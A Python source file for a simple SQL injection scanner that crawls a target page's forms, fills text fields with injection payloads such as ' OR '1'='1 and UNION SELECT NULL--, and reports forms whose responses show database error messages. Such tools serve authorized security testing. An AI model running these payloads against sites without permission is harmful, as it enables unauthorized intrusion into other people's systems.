import requests
import urllib.parse
import logging
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)

class SQLiScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Security Scanner)"})
        
        # Core data sets
        self.payloads = ["'", "\"", "' OR '1'='1", "' UNION SELECT NULL--", "';--"]
        self.error_patterns = [
            "mysql_fetch_array", "ORA-01756", "Microsoft OLE DB Provider",
            "PostgreSQL query failed", "MySQLSyntaxErrorException", "SQL Server"
        ]

    def _get_soup(self, url):
        """Helper to fetch and parse a URL."""
        try:
            response = self.session.get(url, timeout=10)
            return BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            logger.error(f"Failed to reach {url}: {e}")
            return None

    def get_forms(self, url):
        """Extracts all forms from the page."""
        soup = self._get_soup(url)
        return soup.find_all('form') if soup else []

    def extract_form_details(self, form):
        """Extracts action, method, and all input fields from a form."""
        details = {
            "action": form.attrs.get("action", "").lower(),
            "method": form.attrs.get("method", "get").lower(),
            "inputs": []
        }
        
        # Find inputs, textareas, and selects
        for tag in form.find_all(["input", "textarea", "select"]):
            details["inputs"].append({
                "type": tag.attrs.get("type", "text"),
                "name": tag.attrs.get("name")
            })
        return details

    def _build_payload_data(self, inputs, payload):
        """Constructs the data dictionary for the request."""
        data = {}
        for item in inputs:
            name = item["name"]
            if not name: continue
            
            # Inject payload into text-based fields
            if item["type"] in ["text", "search", "password", "textarea"]:
                data[name] = payload
            elif item["type"] == "email":
                data[name] = f"test{payload}@example.com"
            else:
                data[name] = "test"
        return data

    def test_form(self, form_details):
        """Tests a specific form against the payload list."""
        target_url = urllib.parse.urljoin(self.target_url, form_details["action"])
        
        for payload in self.payloads:
            data = self._build_payload_data(form_details["inputs"], payload)
            
            try:
                if form_details["method"] == "post":
                    resp = self.session.post(target_url, data=data)
                else:
                    resp = self.session.get(target_url, params=data)

                # Check for error signatures
                for pattern in self.error_patterns:
                    if pattern.lower() in resp.text.lower():
                        logger.info(f"[!] VULNERABLE: {target_url} | Payload: {payload}")
                        return True
            except requests.RequestException:
                continue
        return False

    def run(self):
        """Main execution logic."""
        logger.info(f"[*] Starting SQLi scan on: {self.target_url}")
        forms = self.get_forms(self.target_url)
        logger.info(f"[*] Found {len(forms)} forms.")

        vulnerabilities = 0
        for form in forms:
            details = self.extract_form_details(form)
            if self.test_form(details):
                vulnerabilities += 1
        
        logger.info(f"[*] Scan complete. Total vulnerabilities found: {vulnerabilities}")